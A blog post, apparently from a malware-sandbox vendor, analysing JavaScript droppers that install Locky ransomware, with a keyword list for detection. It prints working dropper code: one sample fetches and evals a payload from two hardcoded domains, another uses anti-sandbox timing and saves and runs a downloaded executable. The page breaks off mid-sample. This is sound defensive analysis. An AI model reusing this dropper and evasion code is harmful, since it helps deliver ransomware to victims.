@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="robots" content="index, follow">
+    <meta name="description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta name="keywords" content="Hatching, Hatching Triage, Sandbox, Malware Analysis, Automated Malware Analysis">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+    <meta name="revisit-after" content="3 days">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@hatching_io">
+    <meta name="twitter:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta property="og:url" content="https://www.hatching.io">
+    <link rel="manifest" href="/static/manifest.json">
+    
+      <meta property="og:image" content="https://www.hatching.io/static/images/backgrounds/resized-4.jpg">
+      <meta name="twitter:image" content="https://www.hatching.io/static/images/backgrounds/resized-4.jpg">
+    
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-123677703-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-123677703-1');
+    </script>
+    <link rel="stylesheet" href="https://hatching.io/static/css/index.css?1726233262">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://hatching.io/static/images/favicon-32x32.png?v=21">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://hatching.io/static/images/favicon-16x16.png?v=21">
+    <title>Analysis on Locky dropper mechanisms</title>
+  </head>
+  <body>
+<nav class="site-menu">
+  <ul>
+    <li><a href="/">Home</a></li>
+    <li><a href="/about/">About</a></li>
+    <li><a href="/triage/">Triage</a></li>
+    <li><a class="active" href="/blog/">Blog</a></li>
+    <li><a  href="https://boards.greenhouse.io/recordedfuture" rel="nofollow">Jobs</a></li>
+    <li><a href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" target="_blank">Contact</a></li>
+  </ul>
+</nav>
+<header class="site-nav headroom theme-light">
+  <div class="logo">
+    <a href="/">
+      <img width="210px" src="https://hatching.io/static/images/rf-hatching-black.svg" width="164">
+    </a>
+  </div>
+  <div>
+    <a href="#" class="toggle-menu">
+      Menu
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+  </div>
+</header>
+
+
+<section class="scheme-1 view-context blog-fold blog-article-head" id="fold" data-keep="true">
+  <div class="view-context__body">
+    <div>
+      <div>
+        
+        <h2>Analysis on Locky dropper mechanisms</h2>
+      </div>
+      <ul>
+        <li>Share this:</li>
+        <li class="social">
+          <a href="https://twitter.com/hatching_io" target="_blank">
+            <i class="icon-twitter"></i>
+          </a>
+          <a href="https://www.linkedin.com/company/hatching" target="_blank">
+            <i class="icon-linkedin"></i>
+          </a>
+          <a href="https://www.github.com/hatching" target="_blank">
+            <i class="icon-github"></i>
+          </a>
+        </li>
+      </ul>
+    </div>
+    <div>
+      <h1>Blog.</h1>
+    </div>
+  </div>
+  <div class="background-graphic">
+    
+      <div class="image" style="background-image: url('/static/images/backgrounds/resized-4.jpg');"></div>
+    
+  </div>
+</section>
+
+<article class="view-context blog-article">
+  <header class="blog-article-meta">
+    <div class="blog-article-general">
+      <p><time datetime="2018-10-29T00:00:00Z">2018-10-29</time></p>
+        
+          <ul class="blog-article-tags">
+            <li><p><a href="/blog/#category=locky-dropper">locky-dropper</a></p><li><p><a href="/blog/#category=malware">malware</a></p><li><p><a href="/blog/#category=ransomware">ransomware</a></p><li><p><a href="/blog/#category=ransom">ransom</a></p>
+          </ul>
+        
+    </div>
+    <div class="blog-article-author">
+      <div class="avatar">
+        <img src="/static/images/avatars/jordan.svg" />
+      </div>
+      <div>
+        <h5>Written by <br />Jordan Zwan</h5>
+      </div>
+    </div>
+  </header>
+  <section class="blog-article-body">
+    
+      <h2 id="introduction">Introduction</h2>
+<p>This analysis aims to identify common code structures and methods typically used in various droppers associated with Locky ransomware. It is based on a sample set of 2631 JavaScript samples identified as dropper scrips delivering Locky. The results are illustrated by examination of three samples.</p>
+<p>Locky is a ransomware first seen in 2016 and distributed through the Necurs botnet primarily through email spam campaigns. These emails make use of social engineering tricks such as stating the document contains payment or delivery details and pretending to be a trusted party, tempting the user into opening the attached document. The document contains text persuading the user to enable macros in order to display the content of the document correctly, accompanied by some gibberish and a macro:</p>
+<figure><img src="../../static/images/blog/locky-dropper/maliciousdoc.png">
+</figure>
+
+<p>The macro is actually a dropper script that once enabled will attempt to obtain and execute remote code (the payload). The payload encrypts all accessible files with a strong encryption key, removes backups and leaves behind a ransom note; instructing the user how to pay the Bitcoin equivalent of around $1000 in return for restoring the files:</p>
+<figure><img src="../../static/images/blog/locky-dropper/ransomnote.png">
+</figure>
+
+<p>The scope of this analysis will be limited to the dropper scripts and their role in the infection chain. I started off by comparing words in the code of the JavaScript dropper samples with those in a set of 1160 benign JavaScript samples in order to identify words that exclusively and commonly appeared in the droppers. The result contained many common variable names and other meaningless words, but also revealed which keywords are characteristic for our samples. These are the words that seemed most relevant:</p>
+<p><code>eval (1742), fromcharcode (1270), charcodeat (1136), wscript (692), write (628), activexobject (622), run (549), send (524), responsetext (427), request(391), msxml2(336), status (316), cc_on (303), stream (277), createobject (234).</code></p>
+<p>This gives us an idea what to look out for, and we will see why these words are important in the following examples.</p>
+<h2 id="the-smallest-sample">The smallest sample</h2>
+<p>The smallest sample (464 bytes) in our sample set is this one-liner:</p>
+<pre><code>var z1 = &quot;Msxml2.XMLHTTP&quot;; var m = &quot;zZMD8RQuYDxvBs5l648f_j44Zo9xCdFncmnVmwekzmU6DfGQKPHKeT1ri5mKZ37ggb8bSVqA5ho5OZRl0&quot;; var x = new
+Array(&quot;ektamacha.com&quot;,&quot;singoutloudkaraoke.com&quot;); var z4 = &quot;a&quot;; for (var i=0; i&lt;x.length; i++) { var e = new ActiveXObject(z1); try {
+e.open(&quot;GET&quot;, &quot;http://&quot;+x[i]+&quot;/counter/?&quot;+m, false); e.send(); if (e.status == 200) { var z3 = e.responseText; var z3 = z3.split(m); var
+z3 = z3.join(z4); eval(z3); break; }; } catch(e) { }; };
+</code></pre>
+<p>This code is quite inconvenient to read, which is the first indicator of maliciousness. Almost all our dropper scripts are stripped from all styling and indentation in an attempt to obfuscate its content. The first thing we want to do in order to make the code more readable is beautifying it. I used <a href="https://beautifier.io/">https://beautifier.io/</a> for beautifying the code throughout this post. The beautified code looks like this:</p>
+<pre><code>var z1 = &quot;Msxml2.XMLHTTP&quot;;
+var m = &quot;zZMD8RQuYDxvBs5l648f_j44Zo9xCdFncmnVmwekzmU6DfGQKPHKeT1ri5mKZ37ggb8bSVqA5ho5OZRl0&quot;;
+var x = new Array(&quot;ektamacha.com&quot;, &quot;singoutloudkaraoke.com&quot;);
+var z4 = &quot;a&quot;;
+for (var i = 0; i &lt; x.length; i++) {
+    var e = new ActiveXObject(z1);
+    try {
+        e.open(&quot;GET&quot;, &quot;http://&quot; + x[i] + &quot;/counter/?&quot; + m, false);
+        e.send();
+        if (e.status == 200) {
+            var z3 = e.responseText;
+            var z3 = z3.split(m);
+            var z3 = z3.join(z4);
+            eval(z3);
+            break;
+        };
+    } catch (e) {};
+};
+</code></pre>
+<p>The variable names do not make any sense, which is another very common way of obfuscating code. Let&rsquo;s rename the variables, referring to what they contain for more clarity. After doing so, we end up with:</p>
+<pre><code>var xmlhttpObject = &quot;Msxml2.XMLHTTP&quot;;
+var urlLastPart = &quot;zZMD8RQuYDxvBs5l648f_j44Zo9xCdFncmnVmwekzmU6DfGQKPHKeT1ri5mKZ37ggb8bSVqA5ho5OZRl0&quot;;
+var domains = new Array(&quot;ektamacha.com&quot;, &quot;singoutloudkaraoke.com&quot;);
+var joinSeperator = &quot;a&quot;
+for (var i = 0; i &lt; domains.length; i++) {
+    var actXobj = new ActiveXObject(xmlhttpObject);
+    try {
+        actXobj.open(&quot;GET&quot;, &quot;http://&quot; + x[i] + &quot;/counter/?&quot; + urlLastPart, false);
+        actXobj.send();
+        if (actXobj.status == 200) {
+            var responsetext = actXobj.responseText;
+            var responsetext = responsetext.split(urlLastPart);
+            var payload = responsetext.join(joinSeperator);
+            eval(payload);
+            break;
+        };
+    } catch (actXobj) {};
+};
+</code></pre>
+<p>It becomes apparent that this script is indeed a fully-functioning dropper script as we can identify functions to download and execute additional code obtained from one of the hardcoded URLs. The code is barely obfuscated and demonstrates how little code is needed to be able to execute remote code and fulfill the dropper&rsquo;s role in the infection chain. Do note that the dropper contains no encryption or otherwise directly harmful instructions at all and the outcome of running the script is determined by the additional code downloaded from one of the compromised servers. This type of dropper has been thoroughly analyzed and is widely detected. At the time of writing, none of its URLs are responsive, making this sample a dud.</p>
+<p>Usually, more obfuscation is applied in our samples. This makes the code much longer and harder to understand through static analysis. However, every dropper tries to achieve the same goals as the example above, hence contains similar code after deobfuscation. We can see how even our smallest sample takes further measures to hinder analysis. The URLs are split up into several parts to avoid string matching and the payload has been obfuscated by <code>join</code> and <code>split</code> to become invalid JavaScript code. In order to run the payload that is retrieved from one of the URLs and deobfuscated the <code>eval</code> function is used. The <code>eval</code> function accepts a string and evaluates it as JavaScript. It is commonly used among our samples for executing the dynamically constructed instructions required to complete the infection.</p>
+<h2 id="some-evasion-and-obfuscation">Some evasion and obfuscation</h2>
+<p>Let&rsquo;s take a look at which features this larger script has to add to that (after beautifying and renaming the variables in it):</p>
+<pre><code>var atWindows = false;
+var createObjStr = &quot;CreateObject&quot;;
+var shell = function createShell() {
+        return WScript[createObjStr](&quot;WScript&quot; + &quot;.Shell&quot;);
+    }(),
+    dummyInt = 11;
+var xmlHttpStr = &quot;MSXML2.XMLHTTP&quot;;
+var intZero = 0;
+
+function runFunc(arg1) {
+    shell[&quot;Run&quot;](arg1, intZero, intZero);
+};
+
+function xmlObjFunc() {
+    return xmlHttpStr;
+};
+
+function difference(int1, int2) {
+    return int1 - int2;
+};
+
+function createObjStr() {
+    return createObjStr;
+};
+/*@cc_on
+  @if (@_win32 || @_win64)
+    atWindows = true;
+  @end
+@*/
+if (atWindows) {
+    var openStr = &quot;&quot;;
+
+    function sleepTime() {
+        return 23;
+    };
+
+    function sleepTimeDiff() {
+        var dateTime = new this[&quot;Date&quot;]();
+        var time1 = dateTime[&quot;getUTCMilliseconds&quot;]();
+        WScript[&quot;Sleep&quot;](sleepTime());
+        var dateTime = new this[&quot;Date&quot;]();
+        var time2 = dateTime[&quot;getUTCMilliseconds&quot;]();
+        WScript[&quot;Sleep&quot;](sleepTime());
+        var dateTime = new this[&quot;Date&quot;]();
+        var time3 = dateTime[&quot;getUTCMilliseconds&quot;]();
+        var diff1 = &quot;&quot;;
+        diff1 = difference(time2, time1);
+        var diff2 = &quot;&quot;;
+        diff2 = difference(time3, time2);
+        openStr = &quot;open&quot;;
+        return difference(diff1, diff2);
+    }
+
+    var timeDiffFound = false;
+    for (var i = intZero; i &lt; sleepTime() * 1; i++) {
+        if (sleepTimeDiff() != intZero) {
+            timeDiffFound = true;
+            diff2 = &quot;21&quot; + 231 - diff1 * diff2;
+            break;
+        }
+    }
+
+    function timeDiffBool() {
+        return (timeDiffFound == true) ? 1 : intZero;
+    };
+    if (timeDiffFound &amp;&amp; timeDiffBool()) {
+        function exePathFunc() {
+            return shell[&quot;ExpandEnvironmentStrings&quot;](&quot;%TEMP%/&quot;) + &quot;KifarfRIw.exe&quot;;
+        };
+        xmlHttpObj = xmlObjFunc()
+        agent = WScript[createObjStr](xmlHttpObj);
+        var int = 1;
+        do {
+            for (; int;) {
+                try {
+                    if (int == 1) {
+                        agent[openStr](&quot;GET&quot;, &quot;&lt;Live URL Removed&gt;&quot;, false);
+                        agent[&quot;send&quot;]();
+                        sleepStr = &quot;Sleep&quot;;
+                        int = 2;
+                    }
+                    WScript[sleepStr](sleepTime() + 120);
+                    if (agent[&quot;readystate&quot;] &lt; 4) continue;
+                    int = intZero;
+
+                    function listFunc(arg2) {
+                        var list = (1, 2, 3, 4, 5, arg2);
+                        return list;
+                    };
+                    stream = WScript[createObjStr()](&quot;ADODB.Stream&quot;);
+                    xmlHttpObj = stream;
+                    xmlHttpObj[openStr]();
+                    xmlHttpObj[&quot;type&quot;] = listFunc(1);
+                    xmlHttpObj[&quot;write&quot;](agent[&quot;ResponseBody&quot;]);
+                    stream[&quot;position&quot;] = listFunc(intZero);
+                    xmlHttpObj[&quot;SaveToFile&quot;](exePathFunc(), 2);
+                    stream[&quot;close&quot;]();
+                    exePath = exePathFunc();
+                    runFunc(exePath);
+                } catch (dummy) {};
+            };
+        } while (int);
+    }
+}
+</code></pre>
+<p>The code involves steps, functions, and control flows that seem abundant or illogical. Such added code is common among our samples and is done in order to further obstruct static analysis by making the method of operation of the script less apparent (without altering it).</p>
+<p>This sample uses <code>WScript</code>&rsquo;s sleep function to sleep 23 seconds up to 23 times, and compares the millisecond part of the time before and after the sleep. If the sleep gets executed on a real machine, a small variation in actual time slept (in ms) is to be expected. However, if such a script would be analysed in a sandbox environment the sleep commands might get skipped to avoid long waiting time prior to the script doing anything (a common anti-sandboxing technique). In this case, skipping the sleep commands would cause the difference in amount of time slept to be exactly 0 ms without any variation, telling the script that this this is not a real machine.</p>
+<p>We also see <code>/*@cc_on</code> making an appearance in the code. This is a conditional compilation statement, which exclusively gets compiled if the browser is Internet Explorer and is used in this case to verify that this is the case. Only when the machine is found to be &ldquo;real&rdquo; and the browser is Internet Explorer the dropper section of the script will execute. Otherwise, the script will close in an attempt to avoid detection. These kind of countermeasures against dynamic analysis are known as evasion techniques, and are the dynamic equivalent of obfuscation.</p>
+<p>The dropper section at the end of this script bears close resemblance to the script in the previous example, but this dropper utilizes a WScript shell instead of an ActiveXObject for the dropper features. It also saves the payload to disk as an executable and runs it with WScript&rsquo;s <code>Run</code>, instead of storing it into a variable and using <code>eval</code> for executing the payload.</p>
+<p>For further dynamic and behavioral analysis, we should run the sample through Cuckoo, which will provide a detailed report about what happens when we run the script. Here&rsquo;s an overview of the signatures that triggered for this sample:</p>
+<figure><img src="../../static/images/blog/locky-dropper/cuckooanalysis.png">
+</figure>
+
+<p>I highlighted the signatures which indicate a dropper feature, and combined we can recognize full dropper capability. Cuckoo&rsquo;s report also provides the URL we identified through static analysis and shows that the scrips utilizes WScript to download, save, and run an executable. The report will also present the network traffic, dropped executable, and behavior of subsequent infection stages. In this case, the dropper is able to communicate with the server to obtain an executable and run it, fulfilling its role in the infection chain.</p>
+<h2 id="a-sample-containing-another-layer-of-code">A sample containing another layer of code</h2>
+<p>The following script looks very different from the previous ones, and its dropper capabilities are not immediately apparent. Its size is ~450KB, which is about 1000 times larger than our first sample. It contains one function, a huge array of two to three character strings, a dictionary, a for-loop, and an <code>eval</code>. Besides that, it contains a lot of junk in a try-catch statement and a full copy of this entire code. However, it doesn&rsquo;t contain any signs of the suspicious strings we have found by parsing, except for one <code>eval</code>. Besides its use in executing the payload, it remains a very popular and powerful tool to execute code generated at runtime. Here&rsquo;s what the code looks like after some deobfuscation and renaming. I also removed the junk code, the copy, and most of the entries in the array:</p>
+<pre><code>var array = new Array(&quot;Jm&quot;, &quot;Eu&quot;, &quot;Ov&quot;, &quot;Yi&quot;, &quot;Ho&quot;, &quot;EPs&quot;, &quot;Qi&quot;, &quot;Ov&quot;, &quot;VAg&quot;, &quot;Zs&quot;, &quot;VTc&quot;, &quot;CMr&quot;, &quot;Wq&quot;, &quot;Nv&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;Kh&quot;, &quot;Nv0&quot;, &quot;KYf&quot;, &quot;VAg&quot;, &quot;Df&quot;, &quot;Nr&quot;, &quot;ZBy&quot;, &quot;EPs&quot;, &quot;WUh&quot;, &quot;Eu&quot;, &quot;El&quot;, &quot;Kr&quot;, &quot;Jm&quot;, &quot;Eu&quot;, &quot;ZBy&quot;, &quot;Ho&quot;, &quot;El&quot;, &quot;Kr&quot;, &quot;VAg&quot;, &quot;Vg&quot;, &quot;VAg&quot;, &quot;Ya&quot;, &quot;BUn&quot;, &quot;Va&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Yi&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;KYf&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;EPs&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Fn&quot;, &quot;Ho&quot;, &quot;Ya&quot;, &quot;Bu&quot;, &quot;Nv&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;Kh&quot;, &quot;Nv0&quot;, &quot;KYf&quot;, &quot;VAg&quot;, &quot;Df&quot;, &quot;Yi&quot;, &quot;VAg&quot;, &quot;Vg&quot;, &quot;VAg&quot;, &quot;Ya&quot;, &quot;Yr&quot;, &quot;QMf&quot;, &quot;Va&quot;, &quot;WUh&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;ZBy&quot;, &quot;Ho&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Zs&quot;, &quot;Ao&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;YDx&quot;, &quot;Qi&quot;, &quot;Qi&quot;, &quot;Ho&quot;, &quot;Yr&quot;, &quot;QMf&quot;, &quot;Yr&quot;, &quot;Yr&quot;, &quot;ZBy&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;WUh&quot;, &quot;ZBy&quot;, &quot;Ho&quot;, &quot;Zs&quot;, &quot;Ao&quot;, &quot;AJl&quot;, &quot;WZw&quot;, &quot;Yr&quot;, &quot;Yr&quot;, &quot;Yi&quot;, &quot;Ao&quot;, &quot;El&quot;, &quot;Fe&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Zs&quot;, &quot;Jf&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Zs&quot;, &quot;Ya&quot;, &quot;Bu&quot;, &quot;Nv&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;Ln&quot;, &quot;OJn&quot;, &quot;QCc&quot;, &quot;Yi&quot;, &quot;Yi&quot;, &quot;Df&quot;, &quot;Qi&quot;, &quot;Ov&quot;, &quot;VAg&quot;, &quot;Kh&quot;, &quot;Nv0&quot;, &quot;KYf&quot;, &quot;VAg&quot;, &quot;Df&quot;, &quot;AJa&quot;, &quot;EJf&quot;, &quot;AJa&quot;, &quot;Ai&quot;, &quot;EJf&quot;, &quot;Ho&quot;, &quot;Ai&quot;, &quot;EJf&quot;, &quot;Ho&quot;, &quot;Ai&quot;, &quot;Kr&quot;, &quot;Ho&quot;, &quot;VAg&quot;, &quot;Vg&quot;, &quot;VAg&quot;, &quot;Ho&quot;, &quot;Nr&quot;, &quot;EPs&quot;, &quot;ZBy&quot;, &quot;CXz&quot;, &quot;Df&quot;, &quot;Nr&quot;, &quot;ZBy&quot;, &quot;EPs&quot;, &quot;WUh&quot;, &quot;Eu&quot;, &quot;El&quot;, &quot;Kr&quot;, &quot;Jm&quot;, &quot;Eu&quot;, &quot;ZBy&quot;, &quot;Ho&quot;, &quot;El&quot;, &quot;Kr&quot;, &quot;Ny&quot;, &quot;CXz&quot;, &quot;Ya&quot;, &quot;We&quot;, &quot;KYf&quot;, &quot;Zs&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Nv0&quot;, &quot;Ho&quot;, &quot;Zs&quot;, &quot;Cz&quot;, &quot;Hy&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Cy&quot;, &quot;Zs&quot;, &quot;Yi&quot;, &quot;Ho&quot;, &quot;Ya&quot;, &quot;Ny&quot;, &quot;VTc&quot;, &quot;Df&quot;, &quot;Nr&quot;, &quot;ZBy&quot;, &quot;EPs&quot;, &quot;WUh&quot;, &quot;Eu&quot;, &quot;El&quot;, &quot;Kr&quot;, &quot;Jm&quot;, &quot;Eu&quot;, &quot;ZBy&quot;, &quot;Ho&quot;, &quot;El&quot;, &quot;Kr&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Fe&quot;, &quot;Va&quot;, &quot;Nr&quot;, &quot;Zs&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;UZb&quot;, &quot;UZb&quot;, &quot;Ya&quot;, &quot;CMr&quot;, &quot;Bu&quot;, &quot;VAg&quot;, &quot;QCc&quot;, &quot;OJn&quot;, &quot;Ln&quot;, &quot;Nv&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;Kh&quot;, &quot;Nv0&quot;, &quot;KYf&quot;, &quot;VAg&quot;, &quot;Df&quot;, &quot;AJa&quot;, &quot;EJf&quot;, &quot;Kr&quot;, &quot;Ai&quot;, &quot;ZBy&quot;, &quot;El&quot;, &quot;MOw&quot;, &quot;Jm&quot;, &quot;Kr&quot;, &quot;VAg&quot;, &quot;Vg&quot;, &quot;VAg&quot;, &quot;Df&quot;, &quot;AJa&quot;, &quot;EJf&quot;, &quot;AJa&quot;, &quot;Ai&quot;, &quot;EJf&quot;, &quot;Ho&quot;, &quot;Ai&quot;, &quot;EJf&quot;, &quot;Ho&quot;, &quot;Ai&quot;, &quot;Kr&quot;, &quot;Ho&quot;, &quot;CXz&quot;, &quot;Ya&quot;, &quot;Ri&quot;, &quot;Ov&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Kh&quot;, &quot;EPs&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;KYf&quot;, &quot;Qi&quot;, &quot;Ov&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Ao&quot;, &quot;Zs&quot;, &quot;Ov&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Ho&quot;, &quot;Ya&quot;, &quot;Ny&quot;, &quot;VTc&quot;, &quot;Ya&quot;, &quot;Va&quot;, &quot;QZt&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Va&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;RUq&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Ri&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;FGr&quot;, &quot;Ya&quot;, &quot;CMr&quot;, &quot;Bu&quot;, &quot;Nv&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;Kh&quot;, &quot;Nv0&quot;, &quot;KYf&quot;, &quot;VAg&quot;, &quot;Df&quot;, &quot;El&quot;, &quot;El&quot;, &quot;VAg&quot;, &quot;Vg&quot;, &quot;VAg&quot;, &quot;Df&quot;, &quot;AJa&quot;, &quot;EJf&quot;, &quot;Kr&quot;, &quot;Ai&quot;, &quot;ZBy&quot;, &quot;El&quot;, &quot;MOw&quot;, &quot;Jm&quot;, &quot;Kr&quot;, &quot;VTc&quot;, &quot;Ya&quot;, &quot;We&quot;, &quot;Qi&quot;, &quot;Ao&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Va&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Fn&quot;, &quot;Zs&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Yi&quot;, &quot;Ya&quot;, &quot;CMr&quot;, &quot;Bu&quot;, &quot;Nv&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;VAg&quot;, &quot;EPs&quot;, &quot;Jm&quot;, &quot;VAg&quot;, &quot;VTc&quot;, &quot;Df&quot;, &quot;El&quot;, &quot;El&quot;, &quot;VAg&quot;, &quot;Vg&quot;, &quot;Vg&quot;, &quot;VAg&quot;, &quot;Df&quot;, &quot;Yi&quot;, &quot;CMr&quot;, &quot;VAg&quot;, &quot;Wq&quot;, &quot;KYf&quot;, &quot;Zs&quot;, &quot;Ho&quot;, &quot;Eu&quot;, &quot;KYf&quot;, &quot;Ov&quot;, &quot;VAg&quot;, &quot;QTk&quot;, &quot;Bu&quot;, &quot;Po&quot;, &quot;Nv&quot;, &quot;Vb&quot;, &quot;Zs&quot;, &quot;UZb&quot;, &quot;ZBy&quot;, &quot;Zs&quot;, &quot;VAg&quot;, &quot;Wq&quot;, &quot;Ho&quot;, &quot;Nr&quot;, &quot;EPs&quot;, &quot;ZBy&quot;, &quot;CXz&quot;, &quot;Ho&quot;, &quot;Nr&quot;, &quot;EPs&quot;, &quot;ZBy&quot;, &quot;CXz&quot;, &quot;Ya&quot;, &quot;Df&quot;, &quot;Nr&quot;, &quot;ZBy&quot;, &quot;EPs&quot;, &quot;WUh&quot;, &quot;Eu&quot;, &quot;El&quot;, &quot;Kr&quot;, &quot;Jm&quot;, &quot;Eu&quot;, &quot;ZBy&quot;, &quot;Ho&quot;, &quot;El&quot;, &quot;Kr&quot;, &quot;Ya&quot;, &quot;Ny&quot;, &quot;Ny&quot;, &quot;CXz&quot;, &quot;Ya&quot;, &quot;Ol&quot;, &quot;Eu&quot;, &quot;EPs&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Ya&quot;, &quot;Vi&quot;, &quot;Ya&quot;, &quot;Ho&quot;, &quot;Ya&quot;, &quot;Ny&quot;, &quot;VTc&quot;, &quot;QTk&quot;, &quot;CMr&quot;, &quot;Bu&quot;, &quot;Po&quot;, &quot;Bu&quot;, &quot;Nv&quot;, &quot;Po&quot;, &quot;Nv&quot;, &quot;Zs&quot;, &quot;VTc&quot;, &quot;CMr&quot;, &quot;Bu&quot;, &quot;Nv&quot;, &quot;Nv&quot;, &quot;Kh&quot;, &quot;Nv0&quot;, &quot;KYf&quot;, &quot;VAg&quot;, &quot;EUf&quot;, &quot;Nv0&quot;, &quot;VAg&quot;, &quot;Vg&quot;, &quot;VAg&quot;, &quot;Ya&quot;, &quot;Cy&quot;, &quot;Qi&quot;, &quot;EPs&quot;, &quot;Ov&quot;, &quot;Ya&quot;, &quot;VAg&quot;, &quot;Vi&quot;, &quot;VAg&quot;, &quot;Ya&quot;, &quot;Ya&quot;, &quot;Bu&quot;, &quot;Qn&quot;, &quot;Nv&quot;, &quot;Kh&quot;, &quot;Nv0&quot;, &quot;KYf&quot;, &quot;VAg&quot;, &quot;HFs&quot;, &quot;Rv&quot;, &quot;Bs&quot;, &quot;VAg&quot;, &quot;Vg&quot;, &quot;VAg&quot;, &lt;...&gt;);
+
+function verifyComSpec() {
+    var agent = &quot;WScript&quot;;
+    var cmdPath = &quot;\%SystemRoot\%\\system32\\cmd.exe&quot;;
+    var shell = this[agent][&quot;CreateObject&quot;](agent + &quot;.Shell&quot;);
+    var system = shell[&quot;Environment&quot;](&quot;SYSTEM&quot;);
+    var cli = system(&quot;ComSpec&quot;);
+    if (cli == cmdPath) {
+        return 1;
+    } else {
+        this[this[&quot;agent&quot;]][&quot;Quit&quot;](1);
+    };
+}
+verifyComSpec();
+
+var code = '';
+
+     var dictionary = {&quot;Nv&quot;: &quot;\x0a&quot;, &quot;Qn&quot;: &quot;\x0d&quot;, &quot;HFs&quot;: &quot;D&quot;, &quot;Sb&quot;: &quot;H&quot;, &quot;EUf&quot;: &quot;L&quot;, &quot;XRe&quot;: &quot;P&quot;, &quot;RUq&quot;: &quot;T&quot;, &quot;VYz&quot;: &quot;X&quot;, &quot;Vb&quot;: &quot;\x09&quot;, &quot;El&quot;: &quot;d&quot;, &quot;Nr&quot;: &quot;h&quot;, &quot;UZb&quot;: &quot;l&quot;, &quot;Fn&quot;: &quot;p&quot;, &quot;Ho&quot;: &quot;t&quot;, &quot;Po&quot;: &quot;\x7d&quot;, &quot;Im&quot;: &quot;\x7c&quot;, &quot;Wq&quot;: &quot;\x7b&quot;, &quot;Ln&quot;: &quot;\x2f&quot;, &quot;MYd&quot;: &quot;\x2d&quot;, &quot;Fe&quot;: &quot;\x2e&quot;, &quot;Vi&quot;: &quot;\x2b&quot;, &quot;Zs0&quot;: &quot;\x2c&quot;, &quot;OJn&quot;: &quot;\x2a&quot;, &quot;We&quot;: &quot;C&quot;, &quot;Rv&quot;: &quot;G&quot;, &quot;Ng&quot;: &quot;K&quot;, &quot;Cz&quot;: &quot;O&quot;, &quot;Bp&quot;: &quot;\x26&quot;, &quot;Va&quot;: &quot;S&quot;, &quot;QMf&quot;: &quot;\x25&quot;, &quot;Ya&quot;: &quot;\x22&quot;, &quot;BUn&quot;: &quot;W&quot;, &quot;Jf&quot;: &quot;x&quot;, &quot;VTc&quot;: &quot;\x28&quot;, &quot;CMr&quot;: &quot;\x29&quot;, &quot;Yi&quot;: &quot;c&quot;, &quot;Kr&quot;: &quot;g&quot;, &quot;PDx&quot;: &quot;k&quot;, &quot;Qi&quot;: &quot;o&quot;, &quot;ZBy&quot;: &quot;s&quot;, &quot;Ld&quot;: &quot;w&quot;, 